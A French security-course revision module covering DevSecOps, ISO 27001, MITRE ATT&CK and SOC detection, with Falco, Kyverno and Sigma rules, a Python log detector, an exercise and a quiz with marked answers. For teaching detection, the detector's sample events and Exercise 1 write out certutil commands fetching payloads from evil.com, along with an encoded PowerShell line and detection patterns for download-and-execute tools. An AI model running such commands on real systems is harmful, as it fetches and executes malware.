# TOME P12 — Architecture Ultime, Leadership Technique & Capstone Final — Jour 584 (6h) : Révision Intensive Semestres 11–12 — DevSecOps, GRC, SOC & Security Architecture

> [!NOTE]
> **Objectifs pédagogiques :**
> - Consolider le pipeline **DevSecOps complet** : Shift-Left, SAST/DAST/SCA/SBOM, Container Security, IaC Security
> - Réviser les cadres **GRC (Gouvernance, Risque & Conformité)** : ISO 27001, DORA, NIST CSF 2.0, NIS2
> - Maîtriser les opérations **SOC (Security Operations Center)** : SIEM, SOAR, détection MITRE ATT&CK, Threat Hunting
> - Synthétiser l'**Architecture de Sécurité d'Entreprise** : défense en profondeur, ZTNA, WAF, DLP, EDR
>
> **Compétences visées :** `SEC-04` (A), `SEC-05` (A), `GRC-01` (A) — DevSecOps, GRC, SOC, Security Architecture

---

## Module 1 — DevSecOps & Supply Chain Security (2h)

### 📖 Récapitulatif DevSecOps S11

```
PIPELINE DEVSECOPS COMPLET — SHIFT-LEFT SECURITY

  ┌──────────────────────────────────────────────────────────────────┐
  │  IDE             → Pre-commit hooks (Semgrep, Gitleaks, detect-secrets) │
  │  Git Push        → SAST (SonarQube, CodeQL), Secret Scanning     │
  │  Build           → SCA (Snyk, pip-audit), SBOM (Syft/CycloneDX) │
  │  Container Build → Image Scan (Trivy, Grype), Dockerfile Lint    │
  │  Deploy (Staging)→ DAST (OWASP ZAP, Nuclei), API Fuzzing        │
  │  Deploy (Prod)   → Runtime Security (Falco), CSPM, CNAPP        │
  │  Post-Deploy     → Pen Test Annuel, Red Team, Bug Bounty        │
  └──────────────────────────────────────────────────────────────────┘

  SBOM (Software Bill of Materials) :
  ┌──────────────────────────────────────────────────────────────────┐
  │  CycloneDX (OWASP) — Format XML/JSON le plus adopté            │
  │  SPDX (Linux Foundation) — Standard ISO/IEC 5962:2021          │
  │  Contenu : Composants, versions, licences, CVEs, hashes SHA256  │
  │  Obligation : Executive Order 14028 (USA), NIS2 Directive (EU)  │
  │                                                                  │
  │  Outils : Syft (génération) + Grype (vulnérabilité) + Dependency-Track │
  └──────────────────────────────────────────────────────────────────┘

  SLSA (Supply chain Levels for Software Artifacts) :
  Level 1 : Provenance générée (non signée) → Documentation
  Level 2 : Provenance signée par build service authentifié → GitHub Actions
  Level 3 : Build isolé + hermétique → SLSA Builder certifié
  Level 4 : Revue de code obligatoire (2 personnes) → Environnements sensibles
```

### 🔍 Kubernetes Security — Falco & Kyverno

```yaml
# ─── FALCO — RÈGLE DE DÉTECTION RUNTIME ───────────────────────────────────
# Détection d'exécution de shell dans un conteneur en production
- rule: Terminal shell in container
  desc: >
    Détecte l'ouverture d'un shell interactif dans un conteneur.
    Signe possible d'intrusion ou de debug non autorisé.
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
    and not user_expected_terminal_processes
  output: >
    Shell spawned in a container (user=%user.name cmd=%proc.cmdline
    container=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [container, shell, T1059]

# ─── KYVERNO — POLITIQUE D'ADMISSION K8S ──────────────────────────────────
# Interdire les pods en mode privileged (Kyverno ClusterPolicy)
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged-containers
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-privileged
      match:
        resources:
          kinds: [Pod]
      validate:
        message: "Les conteneurs privileged sont interdits par politique de sécurité PARADIS."
        pattern:
          spec:
            containers:
              - =(securityContext):
                  =(privileged): "false"
```

---

## Module 2 — GRC & SOC (2h)

### 🔍 ISO 27001:2022 — Les 93 Contrôles (Annexe A Révisée)

```
ISO 27001:2022 — 4 CATÉGORIES DE CONTRÔLES (Annexe A)

  A.5  — Contrôles Organisationnels  (37 contrôles)
        Ex: A.5.7 Threat Intelligence, A.5.23 Sécurité Cloud
  A.6  — Contrôles des Personnes      (8 contrôles)
        Ex: A.6.3 Sensibilisation, A.6.7 Télétravail
  A.7  — Contrôles Physiques          (14 contrôles)
        Ex: A.7.4 Surveillance physique, A.7.9 Clear Desk Policy
  A.8  — Contrôles Technologiques     (34 contrôles)
        Ex: A.8.7 Protection Anti-Malware, A.8.16 Monitoring d'activité

  NOUVEAUX CONTRÔLES ISO 27001:2022 (non présents dans 2013) :
  - A.5.7  Threat Intelligence
  - A.5.23 Sécurité des services cloud
  - A.8.9  Gestion de la configuration
  - A.8.10 Suppression d'information (Data Erasure NIST 800-88)
  - A.8.11 Data Masking
  - A.8.12 Data Leakage Prevention (DLP)
  - A.8.23 Web Filtering
  - A.8.28 Secure Coding
```

### 🔍 SOC — Détection MITRE ATT&CK & SOAR

```
CHAÎNE DE KILL MITRE ATT&CK (Enterprise) — PHASE → TTP

  TA0001 Initial Access     → Phishing (T1566), Valid Accounts (T1078)
  TA0002 Execution          → PowerShell (T1059.001), WMI (T1047)
  TA0003 Persistence        → Scheduled Tasks (T1053), Registry Run Keys
  TA0004 Privilege Escalation → UAC Bypass (T1548), Token Impersonation
  TA0005 Defense Evasion    → Obfuscation (T1027), Living-off-Land (LotL)
  TA0006 Credential Access  → Mimikatz LSASS dump (T1003.001), Kerberoasting
  TA0007 Discovery          → Net/Nltest, BloodHound (T1087)
  TA0008 Lateral Movement   → Pass-the-Hash (T1550.002), WMI Remote
  TA0009 Collection         → Clipboard Capture, Keylogging (T1056)
  TA0010 Exfiltration       → DNS Tunneling (T1048.003), HTTPS C2
  TA0011 Command & Control  → Cobalt Strike, Empire C2

  RÈGLE SIGMA (Détection Mimikatz LSASS) :
  title: Mimikatz LSASS Memory Access
  detection:
    selection:
      EventID: 10              # Process Access
      TargetImage|endswith: '\lsass.exe'
      GrantedAccess: '0x1FFFFF'
    condition: selection
  level: critical
  tags:
    - attack.credential_access
    - attack.t1003.001

  CYCLE SOAR (Security Orchestration, Automation & Response) :
  Alert → Enrichissement IOC (VirusTotal/MISP) → Triage Auto →
  Containment Auto (bloquer IP/isoler host) → Notification → Rapport
```

---

## Module 3 — Atelier Pratique : SIEM Log Analyzer & Threat Hunter (1h30)

### 🛠️ Script Python : Log Analyzer & MITRE ATT&CK Pattern Detector

```python
#!/usr/bin/env python3
"""
PARADIS — SIEM Log Analyzer & MITRE ATT&CK Pattern Detector (Révision S11-S12)
Détecte les patterns d'attaque dans des logs Windows EventID.
"""
import re
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from collections import defaultdict
from datetime import datetime

@dataclass
class SecurityEvent:
    timestamp   : str
    event_id    : int
    source      : str      # Machine source
    user        : str
    target_proc : Optional[str] = None
    cmdline     : Optional[str] = None
    granted_access: Optional[str] = None
    raw_data    : dict = field(default_factory=dict)

@dataclass
class ThreatAlert:
    severity    : str   # CRITICAL | HIGH | MEDIUM
    mitre_technique: str
    mitre_id    : str
    description : str
    events      : List[SecurityEvent]

class MITREDetector:
    """Détecteur de TTPs MITRE ATT&CK basé sur des règles Sigma simplifiées"""

    # Patterns de commandes PowerShell suspectes (T1059.001)
    POWERSHELL_SUSPICIOUS = [
        r"(?i)(encodedcommand|-enc)\s+[A-Za-z0-9+/=]{20,}",
        r"(?i)invoke-expression|iex\s*[\(\$]",
        r"(?i)downloadstring|downloadfile",
        r"(?i)bypass.*executionpolicy",
        r"(?i)invoke-mimikatz|sekurlsa",
    ]

    # Processus LOLBIN (Living-off-the-Land Binaries) — T1218
    LOLBIN_PROCESSES = {
        "certutil.exe" : "T1218.013",
        "regsvr32.exe" : "T1218.010",
        "mshta.exe"    : "T1218.005",
        "wscript.exe"  : "T1059.005",
        "rundll32.exe" : "T1218.011",
        "bitsadmin.exe": "T1197"
    }

    def detect_powershell_obfuscation(self, events: List[SecurityEvent]) -> List[ThreatAlert]:
        alerts = []
        for evt in events:
            if evt.event_id not in (4688, 4104):  # Process creation / Script block logging
                continue
            cmdline = evt.cmdline or ""
            for pattern in self.POWERSHELL_SUSPICIOUS:
                if re.search(pattern, cmdline):
                    alerts.append(ThreatAlert(
                        severity       = "HIGH",
                        mitre_technique= "PowerShell Suspicious Command",
                        mitre_id       = "T1059.001",
                        description    = f"Commande PowerShell obfusquée/suspecte depuis {evt.source} par {evt.user}",
                        events         = [evt]
                    ))
                    break
        return alerts

    def detect_lolbin(self, events: List[SecurityEvent]) -> List[ThreatAlert]:
        alerts = []
        for evt in events:
            if evt.event_id != 4688 or not evt.target_proc:
                continue
            proc_name = evt.target_proc.lower().split("\\")[-1]
            if proc_name in self.LOLBIN_PROCESSES:
                alerts.append(ThreatAlert(
                    severity       = "MEDIUM",
                    mitre_technique= f"Signed Binary Proxy Execution ({proc_name})",
                    mitre_id       = self.LOLBIN_PROCESSES[proc_name],
                    description    = f"LOLBIN '{proc_name}' exécuté par {evt.user} sur {evt.source}",
                    events         = [evt]
                ))
        return alerts

    def detect_lsass_access(self, events: List[SecurityEvent]) -> List[ThreatAlert]:
        alerts = []
        for evt in events:
            if evt.event_id != 10:  # Process Access
                continue
            if evt.target_proc and "lsass.exe" in evt.target_proc.lower():
                if evt.granted_access in ("0x1FFFFF", "0x1010", "0x143A"):
                    alerts.append(ThreatAlert(
                        severity       = "CRITICAL",
                        mitre_technique= "LSASS Memory — Credential Dumping (Mimikatz)",
                        mitre_id       = "T1003.001",
                        description    = f"Accès mémoire LSASS CRITIQUE depuis {evt.source} par {evt.user} (access: {evt.granted_access})",
                        events         = [evt]
                    ))
        return alerts

    def run_detection(self, events: List[SecurityEvent]) -> List[ThreatAlert]:
        all_alerts = []
        all_alerts.extend(self.detect_powershell_obfuscation(events))
        all_alerts.extend(self.detect_lolbin(events))
        all_alerts.extend(self.detect_lsass_access(events))
        return all_alerts

    def print_alerts(self, alerts: List[ThreatAlert]):
        icons = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}
        print("=" * 70)
        print("  PARADIS SOC — RAPPORT D'ALERTES MITRE ATT&CK")
        print("=" * 70)
        if not alerts:
            print("  ✅ Aucune alerte détectée dans cet ensemble d'événements.")
            return
        for a in alerts:
            print(f"\n  {icons[a.severity]} [{a.severity:8s}] [{a.mitre_id}] {a.mitre_technique}")
            print(f"             {a.description}")
        print(f"\n  Total : {len(alerts)} alerte(s) — "
              f"🔴 {sum(1 for a in alerts if a.severity=='CRITICAL')} critiques | "
              f"🟠 {sum(1 for a in alerts if a.severity=='HIGH')} hautes | "
              f"🟡 {sum(1 for a in alerts if a.severity=='MEDIUM')} moyennes")
        print("=" * 70)


if __name__ == "__main__":
    print("=== PARADIS SOC — MITRE ATT&CK THREAT DETECTION ENGINE ===\n")

    events = [
        SecurityEvent("2026-08-11T09:12:00Z", 4688, "WS-ADMIN-01", "john.doe",
                      target_proc="C:\\Windows\\System32\\certutil.exe",
                      cmdline="certutil.exe -urlcache -split -f http://evil.com/payload.exe"),
        SecurityEvent("2026-08-11T09:14:30Z", 4104, "WS-ADMIN-01", "john.doe",
                      cmdline="powershell.exe -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA="),
        SecurityEvent("2026-08-11T09:15:01Z", 10, "WS-ADMIN-01", "SYSTEM",
                      target_proc="C:\\Windows\\System32\\lsass.exe",
                      granted_access="0x1FFFFF"),
        SecurityEvent("2026-08-11T09:20:00Z", 4688, "SRV-WEB-02", "svc-app",
                      target_proc="C:\\Windows\\System32\\cmd.exe",
                      cmdline="cmd.exe /c ipconfig /all"),
    ]

    detector = MITREDetector()
    alerts   = detector.run_detection(events)
    detector.print_alerts(alerts)
```

---

## Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **SOAR** | Security Orchestration, Automation and Response — Automatisation des réponses aux incidents |
| **LOLBIN** | Living-off-the-Land Binaries — Binaires légitimes Windows détournés par les attaquants |
| **SBOM** | Software Bill of Materials — Inventaire complet des composants d'un logiciel |
| **SLSA** | Supply chain Levels for Software Artifacts — Framework de sécurité de la chaîne d'approvisionnement |
| **Sigma** | Format de règles de détection open source pour SIEM, transposable en requêtes SIEM/EDR |
| **TTP** | Tactics, Techniques & Procedures — Classification des comportements d'attaquants (MITRE ATT&CK) |

---

## Exercices Pratiques

### Exercice 1 — Classification MITRE ATT&CK

Associez chaque action observée à la **tactique MITRE ATT&CK** et au **TTP** correspondants :

1. Un employé reçoit un email avec une pièce jointe `.docm` contenant des macros VBA malveillantes.
2. Le malware crée une tâche planifiée Windows s'exécutant à chaque démarrage.
3. Un attaquant exécute `mimikatz.exe` pour dumper les hachages NTLM de la mémoire LSASS.
4. L'attaquant utilise `certutil.exe -urlcache -f http://evil.com/c2.exe` pour télécharger un payload.
5. Les données volées sont exfiltrées via des requêtes DNS vers un serveur C2.

**Corrigé :**
1. **TA0001 Initial Access** → T1566.001 Spearphishing Attachment (macro document).
2. **TA0003 Persistence** → T1053.005 Scheduled Task/Job.
3. **TA0006 Credential Access** → T1003.001 OS Credential Dumping: LSASS Memory.
4. **TA0005 Defense Evasion** → T1218.013 Signed Binary Proxy Execution: Certutil (LOLBIN).
5. **TA0010 Exfiltration** → T1048.003 Exfiltration Over Alternative Protocol: DNS.

---

## Banque QCM — 5 Questions

**Q1.** Qu'est-ce que le **Shift-Left Security** dans un pipeline DevSecOps ?

- A) Déplacer les équipes de sécurité vers la gauche du bureau en open space.
- B) Intégrer les contrôles et tests de sécurité le plus tôt possible dans le cycle de développement (dès le code de l'IDE), plutôt qu'attendre les phases de test ou de déploiement. ✅
- C) Utiliser uniquement des outils open source pour la sécurité.
- D) Effectuer les audits de sécurité une fois par an.

**Q2.** Un **SBOM (Software Bill of Materials)** sert principalement à :

- A) Facturer les logiciels utilisés dans un projet.
- B) Lister exhaustivement tous les composants (bibliothèques, dépendances, licences) d'un logiciel, permettant de détecter rapidement les CVEs et les violations de licences. ✅
- C) Documenter l'architecture du système.
- D) Gérer les utilisateurs d'un système.

**Q3.** Selon le framework **MITRE ATT&CK**, la tactique **TA0005 Defense Evasion** regroupe les techniques utilisées pour :

- A) Voler des données sensibles.
- B) Éviter d'être détecté par les solutions de sécurité (antivirus, EDR, SIEM) tout au long de l'attaque. ✅
- C) S'introduire initialement dans le système.
- D) Maintenir la persistance après compromission.

**Q4.** Quel standard ISO définit le **Système de Management de la Sécurité de l'Information (SMSI)** avec ses 93 contrôles (version 2022) ?

- A) ISO 9001
- B) ISO 27001 ✅
- C) ISO 31000
- D) ISO 22301

**Q5.** Un **SOAR** (Security Orchestration, Automation and Response) se distingue d'un **SIEM** principalement parce que :

- A) Le SOAR stocke les logs, le SIEM les analyse.
- B) Le SOAR ajoute une couche d'orchestration et d'automatisation des réponses aux incidents (isoler un host, bloquer une IP, créer un ticket JIRA) en plus de la corrélation d'alertes — le SIEM se limitant à la collecte, corrélation et détection. ✅
- C) Le SOAR est moins cher que le SIEM.
- D) Le SIEM remplace le SOAR dans les organisations matures.

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
